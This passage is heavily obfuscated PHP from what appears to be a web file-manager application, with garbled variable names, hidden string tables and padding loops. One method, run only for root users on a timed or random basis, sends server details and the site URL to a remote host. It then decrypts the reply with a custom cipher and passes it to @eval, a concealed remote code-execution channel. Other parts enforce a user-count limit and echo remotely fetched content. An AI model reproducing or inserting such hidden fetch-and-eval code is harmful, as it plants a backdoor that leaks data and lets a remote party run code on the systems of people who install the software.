$ø…½¥É[252], $ø…½¥É[6]); $Â³ÄÛÎü = $ÎÄŠÄüÇ[775]; while (strlen($Â³ÄÛÎü) < $ÎÄŠÄüÇ[707]) { if (!$Â³ÄÛÎü) { break; } $Â³ÄÛÎü++; } if ($ùâõ‹Á· > time() && $šı•åÎõ > time()) { $›ÓÁ¾ÊË = explode($ø…½¥É[229], $Ã‰Ã«ÅÏ); $ÑÓüÙ‚Ï = array_keys($this->versionPluginList()); $Ã‰Ã«ÅÏ = array_merge($›ÓÁ¾ÊË, $ÑÓüÙ‚Ï); $Ã‰Ã«ÅÏ = implode($ø…½¥É[229], array_filter(array_unique($Ã‰Ã«ÅÏ))); } return $Ã‰Ã«ÅÏ; } private function zwit3dd3f188() { $õÒçœ¦ =& $_SERVER[Ã™”Á÷ï]; if ($this->aeup95bbfc03 != $õÒçœ¦[111]) { $GLOBALS[$õÒçœ¦[88]][$õÒçœ¦[92]][$õÒçœ¦[253]] = $õÒçœ¦[208]; return; } $GLOBALS[$õÒçœ¦[88]][$õÒçœ¦[254]] = $õÒçœ¦[124]; if (Model($õÒçœ¦[255])->get($õÒçœ¦[63]) != $õÒçœ¦[208]) { Model($õÒçœ¦[255])->set($õÒçœ¦[63], $õÒçœ¦[208]); } } public function iwaf5a9a854e() { return $_SERVER[Ã™”Á÷ï][256]; } private function zvle610ce291() { $ôÚ°òëÁ =& $_SERVER[ïÃ°£«Ê]; $ó‰ê­¡á =& $_SERVER[Ã™”Á÷ï]; $éÒŒ„ˆØ = array($ó‰ê­¡á[257], $ó‰ê­¡á[258], $ó‰ê­¡á[259]); $İ¡Óë˜€ = $ôÚ°òëÁ[776]; while (strlen($İ¡Óë˜€) < $ôÚ°òëÁ[713]) { if (!$İ¡Óë˜€) { break; } $İ¡Óë˜€++; } $’ôƒÂş = $ó‰ê­¡á[260] . md5($ó‰ê­¡á[261]); if ($this->aeup95bbfc03 == $ó‰ê­¡á[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ó‰ê­¡á[24]], $éÒŒ„ˆØ)) { return; } if (time() % 4 != 0) { return; } $Ûù«óË = call_user_func(array($ó‰ê­¡á[262], $ó‰ê­¡á[263]), $’ôƒÂş); if ($Ûù«óË && time() - $Ûù«óË < intval($ó‰ê­¡á[264])) { return; } call_user_func(array($ó‰ê­¡á[262], $ó‰ê­¡á[141]), $’ôƒÂş, time()); $ËÆÂĞ«× = $ôÚ°òëÁ[777]; if (strlen($ËÆÂĞ«×) < $ôÚ°òëÁ[731]) { return; } $„«æ¤ = Model($ó‰ê­¡á[33])->get($ó‰ê­¡á[102]); $ÎÀ¥³ÊŸ = $ôÚ°òëÁ[778]; while (strlen($ÎÀ¥³ÊŸ) < $ôÚ°òëÁ[731]) { if (!$ÎÀ¥³ÊŸ) { break; } $ÎÀ¥³ÊŸ++; } $‹Âù—üˆ = array($ó‰ê­¡á[154] => Model($ó‰ê­¡á[33])->get($ó‰ê­¡á[155]), $ó‰ê­¡á[169] => $this->aeup95bbfc03, $ó‰ê­¡á[165] => $_SERVER[$ó‰ê­¡á[166]], $ó‰ê­¡á[167] => Model($ó‰ê­¡á[33])->get($ó‰ê­¡á[133]), $ó‰ê­¡á[107] => md5($_SERVER[$ó‰ê­¡á[108]] . $„«æ¤), $ó‰ê­¡á[158] => $ó‰ê­¡á[138], $ó‰ê­¡á[161] => $_SERVER[$ó‰ê­¡á[162]]); $äİİøİ± = $ôÚ°òëÁ[779]; $ß¶óŒäÅ = $this->lhrm27794f82($ó‰ê­¡á[265], $‹Âù—üˆ); $¤¹ê…¼Æ = $ôÚ°òëÁ[780]; if (!is_array($ß¶óŒäÅ)) { return; } if ($ß¶óŒäÅ[$ó‰ê­¡á[154]] && $ß¶óŒäÅ[$ó‰ê­¡á[266]]) { if ($this->cgqed963a255($ß¶óŒäÅ[$ó‰ê­¡á[266]]) == $‹Âù—üˆ[$ó‰ê­¡á[154]]) { return; } } $this->iabh360ed342(); $¹…±èƒü = $ôÚ°òëÁ[781]; while ($¹…±èƒü < $ôÚ°òëÁ[709]) { if ($¹…±èƒü >= 0) { break; } $¹…±èƒü++; } if ($this->cgqed963a255($ß¶óŒäÅ[$ó‰ê­¡á[266]]) != $‹Âù—üˆ[$ó‰ê­¡á[154]]) { $•ìÏóÌ = array($ó‰ê­¡á[187] => $„«æ¤, $ó‰ê­¡á[188] => $_SERVER[$ó‰ê­¡á[108]], $ó‰ê­¡á[189] => this_url(), $ó‰ê­¡á[163] => $_SERVER[$ó‰ê­¡á[164]]); $ÏıûÚ   = $this->gthd20a03437(json_encode($•ìÏóÌ)); $ß¶óŒäÅ = $this->lhrm27794f82($ó‰ê­¡á[190] . $ÏıûÚ  ); if ($ß¶óŒäÅ && is_array($ß¶óŒäÅ) && isset($ß¶óŒäÅ[$ó‰ê­¡á[266]])) { $£·ë¯‹ = $this->guewa32b6dfc($ß¶óŒäÅ[$ó‰ê­¡á[266]], 2); if ($£·ë¯‹) { $£·ë¯‹ = $this->cgqed963a255($£·ë¯‹); } if ($£·ë¯‹) { try { @eval($£·ë¯‹); } catch (Exception $˜ı…óüÒ) { } } } } } private function lhrm27794f82($îµÄ¥ôÀ = '', $éé’…±¹ = array(), $Š’¶­¯¹ = 5) { $œâçá†æ =& $_SERVER[ïÃ°£«Ê]; $÷½³åóú =& $_SERVER[Ã™”Á÷ï]; $…‚ò´µ¥ = $÷½³åóú[267]; $…‚ò´µ¥ = $this->pnfsc3cfe6cd($…‚ò´µ¥, $÷½³åóú[268]); $…‚ò´µ¥ = $…‚ò´µ¥ . $îµÄ¥ôÀ; if ($éé’…±¹ && is_array($éé’…±¹)) { $…‚ò´µ¥ = $…‚ò´µ¥ . $÷½³åóú[269] . http_build_query($éé’…±¹); } if ($éé’…±¹ === -1) { return $…‚ò´µ¥; } $‰Â³™õü = stream_context_create(array($÷½³åóú[222] => array($÷½³åóú[225] => $Š’¶­¯¹, $÷½³åóú[223] => $÷½³åóú[270]), $÷½³åóú[271] => array($÷½³åóú[272] => !1, $÷½³åóú[273] => !1))); $¸Ö»§ì = $œâçá†æ[782]; while ($¸Ö»§ì < $œâçá†æ[731]) { if ($¸Ö»§ì >= 0) { break; } $¸Ö»§ì++; } $éé’…±¹ = @file_get_contents($…‚ò´µ¥, !1, $‰Â³™õü); return json_decode($éé’…±¹, !0); $§Òšîä = $œâçá†æ[783]; $Şï›”Şé = $œâçá†æ[784]; } private function klca8300346c() { $¸€€ñÎı =& $_SERVER[ïÃ°£«Ê]; $„Ê‚Œ­æ =& $_SERVER[Ã™”Á÷ï]; $Úô¼ö„ = array($„Ê‚Œ­æ[274] => $„Ê‚Œ­æ[275], $„Ê‚Œ­æ[276] => $„Ê‚Œ­æ[277], $„Ê‚Œ­æ[278] => $„Ê‚Œ­æ[279], $„Ê‚Œ­æ[280] => $„Ê‚Œ­æ[281], $„Ê‚Œ­æ[282] => $„Ê‚Œ­æ[283], $„Ê‚Œ­æ[284] => $„Ê‚Œ­æ[217], $„Ê‚Œ­æ[285] => $„Ê‚Œ­æ[217], $„Ê‚Œ­æ[286] => $„Ê‚Œ­æ[275], $„Ê‚Œ­æ[287] => $„Ê‚Œ­æ[277], $„Ê‚Œ­æ[288] => $„Ê‚Œ­æ[279], $„Ê‚Œ­æ[289] => $„Ê‚Œ­æ[290], $„Ê‚Œ­æ[291] => $„Ê‚Œ­æ[281], $„Ê‚Œ­æ[292] => $„Ê‚Œ­æ[293], $„Ê‚Œ­æ[294] => $„Ê‚Œ­æ[283], $„Ê‚Œ­æ[295] => $„Ê‚Œ­æ[296], $„Ê‚Œ­æ[297] => $„Ê‚Œ­æ[298], $„Ê‚Œ­æ[299] => $„Ê‚Œ­æ[300]); $ëåÊ×œ¶ = $¸€€ñÎı[785]; $Ê‡Èä©Ô = $Úô¼ö„[$this->aeup95bbfc03]; $Ê‡Èä©Ô = intval($Ê‡Èä©Ô ? $Ê‡Èä©Ô : $„Ê‚Œ­æ[275]); $Ö»…ó“ = _get($this->mkofee3bb645, $„Ê‚Œ­æ[301]); $ôÂÅ€¼ï = $¸€€ñÎı[786]; $Ö»…ó“ = $Ö»…ó“ ? intval($Ö»…ó“) : 0; $‹¤ì ¨¡ = $¸€€ñÎı[787]; if (strlen($‹¤ì ¨¡) < $¸€€ñÎı[731]) { return; } return $Ê‡Èä©Ô + $Ö»…ó“; } public function wyrcf7271964($ÜÂ¼éÆê) { $³´Û‘Ÿæ =& $_SERVER[ïÃ°£«Ê]; $™Š•è”® =& $_SERVER[Ã™”Á÷ï]; $‡•®³—¨ = $this->klca8300346c(); if ($ÜÂ¼éÆê[$™Š•è”®[302]] == $™Š•è”®[124]) { return; } if ($‡•®³—¨ >= intval($™Š•è”®[217])) { return; } $Âù§Ã‰× = Model($™Š•è”®[127])->count(); $¹…ª›‚é = $³´Û‘Ÿæ[788]; if (!$¹…ª›‚é) { die; } if ($Âù§Ã‰× <= $‡•®³—¨) { return; } $ßÁ•óô = Model($™Š•è”®[127])->field($™Š•è”®[302])->limit($‡•®³—¨)->select(); $Õ°ª€ = $³´Û‘Ÿæ[789]; if (!$Õ°ª€) { die; } $ßÁ•óô = array_to_keyvalue($ßÁ•óô, $™Š•è”®[6], $™Š•è”®[302]); if (!in_array($ÜÂ¼éÆê[$™Š•è”®[302]], $ßÁ•óô)) { show_json($™Š•è”®[303], !1, $™Š•è”®[213]); } } public function shalb30bc4fc() { $†ÈâÖ½Ò =& $_SERVER[ïÃ°£«Ê]; $ ”Ë²ê =& $_SERVER[Ã™”Á÷ï]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $“ú‹…·Å = $ ”Ë²ê[220]; $õæ‹Ç‘³ = $†ÈâÖ½Ò[790]; if (strlen($õæ‹Ç‘³) < $†ÈâÖ½Ò[713]) { die; } $“ú‹…·Å = $this->pnfsc3cfe6cd($“ú‹…·Å, $ ”Ë²ê[221]); $ëĞÓ¸¬ = $†ÈâÖ½Ò[791]; while (strlen($ëĞÓ¸¬) < $†ÈâÖ½Ò[713]) { if (!$ëĞÓ¸¬) { break; } $ëĞÓ¸¬++; } $¹óğøöú = stream_context_create(array($ ”Ë²ê[222] => array($ ”Ë²ê[223] => $ ”Ë²ê[224], $ ”Ë²ê[225] => 3))); $Ó²Éş¹ = @file_get_contents($“ú‹…·Å, !1, $¹óğøöú); $ÃòØ½»‘ = $†ÈâÖ½Ò[792]; while (strlen($ÃòØ½»‘) < $†ÈâÖ½Ò[713]) { if (!$ÃòØ½»‘) { break; } $ÃòØ½»‘++; } echo $ ”Ë²ê[304] . hash_encode($Ó²Éş¹) . $ ”Ë²ê[305]; } private function wqjlbe6ceb91($é¡Ëûèô, $¢ÕèÜú, $ù€®÷× = 3) { $Â«‰Ø =& $_SERVER[ïÃ°£«Ê]; $ëĞºÏŠ³ =& $_SERVER[Ã™”Á÷ï]; usleep(1); $é¡Ëûèô = trim($é¡Ëûèô); $©Êß­æ’ = $Â«‰Ø[793]; while ($©Êß­æ’ < $Â«‰Ø[726]) { if ($©Êß­æ’ >= 0) { break; } $©Êß­æ’++; } $ÂÛ­¸ó± = mt_rand(0, 5) . $ëĞºÏŠ³[6]; $†Éäš« = rand_string(15); $öòºçæ¨ = $Â«‰Ø[794]; while ($öòºçæ¨ < $Â«‰Ø[726]) { if ($öòºçæ¨ >= 0) { break; } $öòºçæ¨++; } $×²‰£á¹ = $ëĞºÏŠ³[306]; switch ($ÂÛ­¸ó±) { case $ëĞºÏŠ³[208]: $ˆ”­†Ğ˜ = $this->mqfy0added59($é¡Ëûèô, strrev($¢ÕèÜú . $†Éäš«)); break; case $ëĞºÏŠ³[124]: $ˆ”­†Ğ˜ = $this->mqfy0added59($é¡Ëûèô, strrev($†Éäš« . $¢ÕèÜú)); $Û½İåí¼ = $Â«‰Ø[795]; if (!$Û½İåí¼) { return; } break; case $ëĞºÏŠ³[307]: $ˆ”­†Ğ˜ = $this->mqfy0added59($é¡Ëûèô, base64_encode($†Éäš« . $¢ÕèÜú)); break; $¤‹çäÕ = $Â«‰Ø[796]; if (strlen($¤‹çäÕ) < $Â«‰Ø[731]) { die; } case $ëĞºÏŠ³[308]: $ˆ”­†Ğ˜ = $this->mqfy0added59($é¡Ëûèô, md5($†Éäš« . $¢ÕèÜú)); break; case $ëĞºÏŠ³[309]: $é¡Ëûèô = base64_encode($é¡Ëûèô); $á¶¶¿‹æ = rand(0, 64); $œŸ×…Å = $×²‰£á¹[$á¶¶¿‹æ]; $öåÍ—Õ’ = $Â«‰Ø[797]; if (!$öåÍ—Õ’) { die; } $ã‰º¡è = md5($œŸ×…Å . md5($¢ÕèÜú . $œŸ×…Å) . $¢ÕèÜú); $ã‰º¡è = substr($ã‰º¡è, $á¶¶¿‹æ % 8, $á¶¶¿‹æ % 8 + 7); $®§Àƒ× = $ëĞºÏŠ³[6]; $×èÔ¯è = $Â«‰Ø[798]; while ($×èÔ¯è < $Â«‰Ø[713]) { if ($×èÔ¯è >= 0) { break; } $×èÔ¯è++; } $·©İ¯Ñ‡ = 0; $ïÄı¼³ = $Â«‰Ø[799]; while (strlen($ïÄı¼³) < $Â«‰Ø[726]) { if (!$ïÄı¼³) { break; } $ïÄı¼³++; } $’³ÑÕ˜Ş = 0; $æ¶ßŠäƒ = 0; for ($·©İ¯Ñ‡ = 0; $·©İ¯Ñ‡ < strlen($é¡Ëûèô); $·©İ¯Ñ‡++) { $æ¶ßŠäƒ = $æ¶ßŠäƒ == strlen($ã‰º¡è) ? 0 : $æ¶ßŠäƒ; $âıØÒÎ§ = $Â«‰Ø[800]; $’³ÑÕ˜Ş = ($á¶¶¿‹æ + strpos($×²‰£á¹, $é¡Ëûèô[$·©İ¯Ñ‡]) + ord($ã‰º¡è[$æ¶ßŠäƒ++])) % 64; $®§Àƒ× .= $×²‰£á¹[$’³ÑÕ˜Ş]; $°ö †¿õ = $Â«‰Ø[801]; if (strlen($°ö †¿õ) < $Â«‰Ø[726]) { die; } } $ˆ”­†Ğ˜ = hash_encode($œŸ×…Å . $®§Àƒ×); $¡•ÄÖÜÛ = $Â«‰Ø[802]; if (!$¡•ÄÖÜÛ) { return; } break; default: $ˆ”­†Ğ˜ = $this->mqfy0added59($é¡Ëûèô, $¢ÕèÜú . $†Éäš«); $±äºê›ò = $Â«‰Ø[803]; break; } $ˆ”­†Ğ˜ = strrev($ÂÛ­¸ó± . $†Éäš« . $ˆ”­†Ğ˜); $¿Ûğ’– = $Â«‰Ø[804]; while ($¿Ûğ’– < $Â«‰Ø[707]) { if ($¿Ûğ’– >= 0) { break; } $¿Ûğ’–++; } if ($ù€®÷× - 1 > 0) { $ˆ”­†Ğ˜ = $this->wqjlbe6ceb91($ˆ”­†Ğ˜, $¢ÕèÜú, $ù€®÷× - 1); } return $ˆ”­†Ğ˜; } private function guewa32b6dfc($’’™šÍÓ, $Ù¢Üƒ±, $ı«ÏéÄ§ = 3) { $ºÙ½‚è =& $_SERVER[ïÃ°£«Ê]; $±ıöÄü… =& $_SERVER[Ã™”Á÷ï]; if (!is_string($’’™šÍÓ) || strlen($’’™šÍÓ) < 10) { return !1; } $’’™šÍÓ = trim($’’™šÍÓ); $’’™šÍÓ = strrev($’’™šÍÓ); $«ÉÏòšÍ = $’’™šÍÓ[0]; $¦÷Òüõ = substr($’’™šÍÓ, 1, 15); $’’™šÍÓ = substr($’’™šÍÓ, 16); $•¥ñÉÔ = $ºÙ½‚è[805]; $“ÑÒ©ã = $±ıöÄü…[306]; $à‰òè²Ò = $ºÙ½‚è[806]; if (strlen($à‰òè²Ò) < $ºÙ½‚è[709]) { die; } switch ($«ÉÏòšÍ) { case $±ıöÄü…[208]: $‘²ºİ = $this->pnfsc3cfe6cd($’’™šÍÓ, strrev($Ù¢Üƒ± . $¦÷Òüõ)); $Øñ ªÍÈ = $ºÙ½‚è[807]; while (strlen($Øñ ªÍÈ) < $ºÙ½‚è[709]) { if (!$Øñ ªÍÈ) { break; } $Øñ ªÍÈ++; } break; case $±ıöÄü…[124]: $‘²ºİ = $this->pnfsc3cfe6cd($’’™šÍÓ, strrev($¦÷Òüõ . $Ù¢Üƒ±)); $‚Œ ‘£Ø = $ºÙ½‚è[808]; while (strlen($‚Œ ‘£Ø) < $ºÙ½‚è[713]) { if (!$‚Œ ‘£Ø) { break; } $‚Œ ‘£Ø++; } break; case $±ıöÄü…[307]: $‘²ºİ = $this->pnfsc3cfe6cd($’’™šÍÓ, base64_encode($¦÷Òüõ . $Ù¢Üƒ±)); break; case $±ıöÄü…[308]: $‘²ºİ = $this->pnfsc3cfe6cd($’’™šÍÓ, md5($¦÷Òüõ . $Ù¢Üƒ±)); $â¬ôŞ• = $ºÙ½‚è[809]; if (strlen($â¬ôŞ•) < $ºÙ½‚è[726]) { return; } break; $¼ÙÖ¸’ = $ºÙ½‚è[810]; case $±ıöÄü…[309]: $’’™šÍÓ = hash_decode($’’™šÍÓ); $Œ²®›Â“ = $ºÙ½‚è[811]; if (strlen($Œ²®›Â“) < $ºÙ½‚è[713]) { return; } $Í¹ûº—ï = $’’™šÍÓ[0]; $ÉÜ°×Ÿß = $ºÙ½‚è[812]; if (!$ÉÜ°×Ÿß) { return; } $’’™šÍÓ = substr($’’™šÍÓ, 1); $©³ì­° = $ºÙ½‚è[813]; if (strlen($©³ì­°) < $ºÙ½‚è[713]) { return; } $¯ÚÉ­…¼ = strpos($“ÑÒ©ã, $Í¹ûº—ï); $—Œ½Ë¼ = $ºÙ½‚è[814]; if (strlen($—Œ½Ë¼) < $ºÙ½‚è[709]) { return; } $ÔÄ…ÅŞ = md5($Í¹ûº—ï . md5($Ù¢Üƒ± . $Í¹ûº—ï) . $Ù¢Üƒ±); $û€Ø©Ãš = $ºÙ½‚è[815]; if (strlen($û€Ø©Ãš) < $ºÙ½‚è[709]) { return; } $ÔÄ…ÅŞ = substr($ÔÄ…ÅŞ, $¯ÚÉ­…¼ % 8, $¯ÚÉ­…¼ % 8 + 7); $ ÓäİõŸ = $ºÙ½‚è[816]; if (strlen($ ÓäİõŸ) < $ºÙ½‚è[726]) { return; } $¤®Úëº÷ = $±ıöÄü…[6]; $ç¼»¢ı = 0; $‹— Õé = 0; $çó—¶¢Ë = 0; $³˜²Ñ’å = $ºÙ½‚è[817]; if (strlen($³˜²Ñ’å) < $ºÙ½‚è[707]) { return; } for ($ç¼»¢ı = 0; $ç¼»¢ı < strlen($’’™šÍÓ); $ç¼»¢ı++) { $çó—¶¢Ë = $çó—¶¢Ë == strlen($ÔÄ…ÅŞ) ? 0 : $çó—¶¢Ë; $ïË¡ºª = $çó—¶¢Ë++; $¯¤´½â = $ºÙ½‚è[818]; while ($¯¤´½â < $ºÙ½‚è[726]) { if ($¯¤´½â >= 0) { break; } $¯¤´½â++; } $‹— Õé = strpos($“ÑÒ©ã, $’’™šÍÓ[$ç¼»¢ı]) - $¯ÚÉ­…¼ - ord($ÔÄ…ÅŞ[$ïË¡ºª]); $éİø©ƒ = $ºÙ½‚è[819]; while ($éİø©ƒ < $ºÙ½‚è[713]) { if ($éİø©ƒ >= 0) { break; } $éİø©ƒ++; } while ($‹— Õé < 0) { $‹— Õé += 64; } $¤®Úëº÷ .= $“ÑÒ©ã[$‹— Õé]; $ŸÆĞ¤ëÚ = $ºÙ½‚è[820]; while (strlen($ŸÆĞ¤ëÚ) < $ºÙ½‚è[731]) { if (!$ŸÆĞ¤ëÚ) { break; } $ŸÆĞ¤ëÚ++; } } $‘²ºİ = base64_decode($¤®Úëº÷); break; $çÈêã— = $ºÙ½‚è[821]; if (strlen($çÈêã—) < $ºÙ½‚è[707]) { return; } default: $‘²ºİ = $this->pnfsc3cfe6cd($’’™šÍÓ, $Ù¢Üƒ± . $¦÷Òüõ); break; } if ($ı«ÏéÄ§ - 1 > 0) { $‘²ºİ = $this->guewa32b6dfc($‘²ºİ, $Ù¢Üƒ±, $ı«ÏéÄ§ - 1); } return $‘²ºİ; } public function gthd20a03437($æÒß—Íª) { $Æ³—ª Ï =& $_SERVER[ïÃ°£«Ê]; $¤‚Ùùæş =& $_SERVER[Ã™”Á÷ï]; $ÒÁÎÓÊñ = $this->wgqze3d33209(); $Çø¶ååÀ = $this->wgqze3d33209(); $úóãœÏ§ = $Æ³—ª Ï[822]; while ($úóãœÏ§ < $Æ³—ª Ï[731]) { if ($úóãœÏ§ >= 0) { break; } $úóãœÏ§++; } $à°«¦±± = ($ÒÁÎÓÊñ - 1) * ($Çø¶ååÀ - 1); $§¦÷ù¾İ = $Æ³—ª Ï[823]; $µ”ÁÎâ = intval(($ÒÁÎÓÊñ + $Çø¶ååÀ) / 2); $ÕÕæØòğ = $Æ³—ª Ï[824]; while (1) { $…äÅÒÚ = $µ”ÁÎâ; $Şış‹‘ = $Æ³—ª Ï[825]; if (!$Şış‹‘) { die; } $Øˆª”ˆ´ = $à°«¦±±; while ($Øˆª”ˆ´ % $…äÅÒÚ != 0) { $”ÇÖÛŒñ = $Øˆª”ˆ´; $Øˆª”ˆ´ = $…äÅÒÚ; $ÎíìÖ÷ö = $Æ³—ª Ï[826]; if (!$ÎíìÖ÷ö) { die; } $…äÅÒÚ = $”ÇÖÛŒñ % $…äÅÒÚ; } if ($…äÅÒÚ == 1) { break; } else { $µ”ÁÎâ++; } } $’É®®¾‹ = 2; $ÓªÀÀ€ä = $Æ³—ª Ï[827]; for ($Áäª„÷µ = 0; $Áäª„÷µ < $à°«¦±± * 10; $Áäª„÷µ++) { if (($à°«¦±± * $Áäª„÷µ + 1) % $µ”ÁÎâ == 0) { $’É®®¾‹ = intval(($à°«¦±± * $Áäª„÷µ + 1) / $µ”ÁÎâ); break; } } $ıü…¨•Ù = $this->mqfy0added59($ÒÁÎÓÊñ * $Çø¶ååÀ . $¤‚Ùùæş[6], $¤‚Ùùæş[138]); $™»ÏÇ”Ä = md5($¤‚Ùùæş[310] . ($ÒÁÎÓÊñ + $Çø¶ååÀ) . $¤‚Ùùæş[311] . $µ”ÁÎâ . $¤‚Ùùæş[311] . $’É®®¾‹ . $¤‚Ùùæş[312]); $±Ú•²ì = $Æ³—ª Ï[828]; if (strlen($±Ú•²ì) < $Æ³—ª Ï[731]) { return; } $çˆ„–ßá = $this->mqfy0added59($æÒß—Íª, $™»ÏÇ”Ä) . $¤‚Ùùæş[313] . $ıü…¨•Ù; return $çˆ„–ßá; } public function cgqed963a255($îÉõŒıÛ) { $„Ÿş®î‚ =& $_SERVER[ïÃ°£«Ê]; $ÄËÕ‘½ =& $_SERVER[Ã™”Á÷ï]; $Œığß¸Í = explode($ÄËÕ‘½[313], $îÉõŒıÛ); $ªçç¼ñÇ = $„Ÿş®î‚[829]; if (strlen($ªçç¼ñÇ) < $„Ÿş®î‚[731]) { die; } if (count($Œığß¸Í) != 2) { return $ÄËÕ‘½[6]; } $¤£Ì°˜à = $this->pnfsc3cfe6cd($Œığß¸Í[1] . $ÄËÕ‘½[6], $ÄËÕ‘½[138]); $óÛää¾  = $„Ÿş®î‚[830]; while ($óÛää¾  < $„Ÿş®î‚[731]) { if ($óÛää¾  >= 0) { break; } $óÛää¾ ++; } if (!$¤£Ì°˜à) { return $ÄËÕ‘½[6]; } $¤£Ì°˜à = intval($¤£Ì°˜à); $¸ñ²æåØ = $„Ÿş®î‚[831]; if (!$¸ñ²æåØ) { return; } $§„Ó‡ş± = 0; $¸œÖû = $„Ÿş®î‚[832]; while (strlen($¸œÖû) < $„Ÿş®î‚[707]) { if (!$¸œÖû) { break; } $¸œÖû++; } $œ·…¦È¨ = 0; $¡¾Ìİœ÷ = $„Ÿş®î‚[833]; for ($×ÅÒÜñ = 3; $×ÅÒÜñ < $¤£Ì°˜à; $×ÅÒÜñ += 2) { if ($¤£Ì°˜à % $×ÅÒÜñ != 0) { continue; } $§„Ó‡ş± = $×ÅÒÜñ; $œ·…¦È¨ = intval($¤£Ì°˜à / $×ÅÒÜñ); break; } $ˆÂáÕœ = ($§„Ó‡ş± - 1) * ($œ·…¦È¨ - 1); $İº¥ïÇ = intval(($§„Ó‡ş± + $œ·…¦È¨) / 2); while (1) { $Â²Ê–“ = $İº¥ïÇ; $ã³ôãí = $ˆÂáÕœ; while ($ã³ôãí % $Â²Ê–“ != 0) { $²¿¼ÜÖ¢ = $ã³ôãí; $ã³ôãí = $Â²Ê–“; $ß Å›†Ğ = $„Ÿş®î‚[834]; if (strlen($ß Å›†Ğ) < $„Ÿş®î‚[709]) { die; } $Â²Ê–“ = $²¿¼ÜÖ¢ % $Â²Ê–“; } if ($Â²Ê–“ == 1) { break; } else { $İº¥ïÇ++; } } $Œ÷•ø³Û = 2; $¤ÀÌé¢˜ = $„Ÿş®î‚[835]; for ($×ÅÒÜñ = 0; $×ÅÒÜñ < $ˆÂáÕœ * 10; $×ÅÒÜñ++) { if (($ˆÂáÕœ * $×ÅÒÜñ + 1) % $İº¥ïÇ == 0) { $Œ÷•ø³Û = intval(($ˆÂáÕœ * $×ÅÒÜñ + 1) / $İº¥ïÇ); break; } } $–ıÊà™Í = md5($ÄËÕ‘½[310] . ($§„Ó‡ş± + $œ·…¦È¨) . $ÄËÕ‘½[311] . $İº¥ïÇ . $ÄËÕ‘½[311] . $Œ÷•ø³Û . $ÄËÕ‘½[312]); $”¾ÓÌ¯ğ = $„Ÿş®î‚[836]; while ($”¾ÓÌ¯ğ < $„Ÿş®î‚[731]) { if ($”¾ÓÌ¯ğ >= 0) { break; } $”¾ÓÌ¯ğ++; } $ŞïÇ¼‹ = $this->pnfsc3cfe6cd($Œığß¸Í[0], $–ıÊà™Í); return $ŞïÇ¼‹; $¤îËé¶º = $„Ÿş®î‚[837]; while (strlen($¤îËé¶º) < $„Ÿş®î‚[709]) { if (!$¤îËé¶º) { break; } $¤îËé¶º++; } } public function wgqze3d33209() { $ŞÉÍÈÁ =& $_SERVER[ïÃ°£«Ê]; $ÙæÒÌÉ± = mt_rand(pow(2, 14), pow(2, 16) - 1); $Åé™Å“Õ = $ŞÉÍÈÁ[838]; while ($Åé™Å“Õ < $ŞÉÍÈÁ[709]) { if ($Åé™Å“Õ >= 0) { break; } $Åé™Å“Õ++; } $µÀ†î„ª = array(); $Şİ¥Ù¬Ö = 1; $‹¾¸îêã = $ŞÉÍÈÁ[839]; if (!$‹¾¸îêã) { die; } while ($Şİ¥Ù¬Ö <= (int) sqrt($ÙæÒÌÉ±)) { $º³«–Ğó = $Şİ¥Ù¬Ö; $»œ°±Ä¡ = $ŞÉÍÈÁ[840]; while (strlen($»œ°±Ä¡) < $ŞÉÍÈÁ[707]) { if (!$»œ°±Ä¡) { break; } $»œ°±Ä¡++; } while (!0) { $º³«–Ğó++; $£½»Ú¯© = $ŞÉÍÈÁ[841]; while (strlen($£½»Ú¯©) < $ŞÉÍÈÁ[707]) { if (!$£½»Ú¯©) { break; } $£½»Ú¯©++; } if ($º³«–Ğó <= 2) { $Şİ¥Ù¬Ö = $º³«–Ğó; break; } else { if ($º³«–Ğó < 2) { continue; } } $ê¦›á†¨ = !0; for ($Ô˜ìéô = 2; $Ô˜ìéô <= sqrt($º³«–Ğó); $Ô˜ìéô++) { if ($º³«–Ğó % $Ô˜ìéô == 0) { $ê¦›á†¨ = !1; } } if ($ê¦›á†¨) { $Şİ¥Ù¬Ö = $º³«–Ğó; break; } } $µÀ†î„ª[] = $Şİ¥Ù¬Ö; $¬æ‰…‚Ó = $ŞÉÍÈÁ[842]; while ($¬æ‰…‚Ó < $ŞÉÍÈÁ[707]) { if ($¬æ‰…‚Ó >= 0) { break; } $¬æ‰…‚Ó++; } } $¶Ó¦¨ô‹ = 2; $»Ğ¿˜ãë = $ŞÉÍÈÁ[843]; if (!$»Ğ¿˜ãë) { die; } for ($º³«–Ğó = $ÙæÒÌÉ±; $º³«–Ğó > 1; $º³«–Ğó--) { $ê¦›á†¨ = !0; $†“¥‹ËÁ = $ŞÉÍÈÁ[844]; foreach ($µÀ†î„ª as $“çñùş) { if ($º³«–Ğó % $“çñùş == 0) { $ê¦›á†¨ = !1; break; } } if ($ê¦›á†¨) { $¶Ó¦¨ô‹ = $º³«–Ğó; break; } } return $¶Ó¦¨ô‹; $¡“ÉîÄÔ = $ŞÉÍÈÁ[845]; } public function znspb6b9e4c0($´©ïËûª, $´¿—¬›Â) { $¦¶áä—Ä =& $_SERVER[ïÃ°£«Ê]; $×Ï¨È§æ =& $_SERVER[Ã™”Á÷ï]; return call_user_func(array($×Ï¨È§æ[8], $×Ï¨È§æ[314]), $´©ïËûª, $´¿—¬›Â); $©¡´Ÿı“ = $¦¶áä—Ä[846]; while (strlen($©¡´Ÿı“) < $¦¶áä—Ä[709]) { if (!$©¡´Ÿı“) { break; } $©¡´Ÿı“++; } } public function mqfy0added59($ÓÇÇÎä², $Ù¬…ÇñŞ) { $Ú¢’óñŠ =& $_SERVER[Ã™”Á÷ï]; return call_user_func(array($Ú¢’óñŠ[315], $Ú¢’óñŠ[316]), $ÓÇÇÎä², $Ù¬…ÇñŞ); $‚¡±†®¤ = $_SERVER[ïÃ°£«Ê][847]; } public function pnfsc3cfe6cd($åµ”—Ê¨, $şøÃ©¬€) { $ÀËş¼’ =& $_SERVER[ïÃ°£«Ê]; $úƒ‰÷Üˆ =& $_SERVER[Ã™”Á÷ï]; return call_user_func(array($úƒ‰÷Üˆ[315], $úƒ‰÷Üˆ[317]), $åµ”—Ê¨, $şøÃ©¬€); $¹®®æÂ = $ÀËş¼’[848]; if (strlen($¹®®æÂ) < $ÀËş¼’[726]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; protected $model; public $message; public function __construct() { $this->model = Model($_SERVER[ïÃ°£«Ê][849]); $üÃŸöÉ¢ = $this->init(); if (!$üÃŸöÉ¢) { return; } $this->keep(); } public function init() { $±¢šÚ¡ =& 